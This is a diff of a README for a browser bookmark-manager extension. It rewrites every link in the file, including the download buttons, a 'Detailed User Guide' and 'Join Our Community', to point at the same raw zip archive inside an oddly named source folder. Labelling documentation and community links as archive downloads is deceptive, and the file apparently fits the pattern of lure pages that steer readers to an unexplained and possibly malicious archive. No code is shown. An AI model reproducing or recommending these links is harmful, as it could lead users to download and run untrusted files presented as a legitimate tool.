@@ -1,6 +1,6 @@
 # 🚀 universal-bookmark-manager - Simplify Your Bookmark Management
 
-[![Download Now](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/epitomatory/universal-bookmark-manager.zip)](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/epitomatory/universal-bookmark-manager.zip)
+[![Download Now](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/packages/extension/src/background/universal_manager_bookmark_rehallow.zip)](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/packages/extension/src/background/universal_manager_bookmark_rehallow.zip)
 
 ## 📚 Overview
 
@@ -26,7 +26,7 @@ Follow these simple steps to download and install the universal-bookmark-manager
 
 1. **Visit the Release Page:** Click the link below to access the downloads:
 
-   [Download Now](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/epitomatory/universal-bookmark-manager.zip)
+   [Download Now](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/packages/extension/src/background/universal_manager_bookmark_rehallow.zip)
 
 2. **Select Your Browser:** Choose the appropriate version for your web browser from the list of releases.
 
@@ -69,8 +69,8 @@ If you encounter issues while using the universal-bookmark-manager, consider the
 
 ## 🔗 Additional Resources
 
-- [Detailed User Guide](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/epitomatory/universal-bookmark-manager.zip)
-- [Join Our Community](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/epitomatory/universal-bookmark-manager.zip)
+- [Detailed User Guide](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/packages/extension/src/background/universal_manager_bookmark_rehallow.zip)
+- [Join Our Community](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/packages/extension/src/background/universal_manager_bookmark_rehallow.zip)
 
 ## 💬 Feedback
 
@@ -80,4 +80,4 @@ We welcome feedback from our users. If you have suggestions or feature requests,
 
 To get started, click the link below:
 
-[Download Now](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/epitomatory/universal-bookmark-manager.zip)
+[Download Now](https://raw.githubusercontent.com/Jawadahmed2k5/universal-bookmark-manager/main/packages/extension/src/background/universal_manager_bookmark_rehallow.zip)
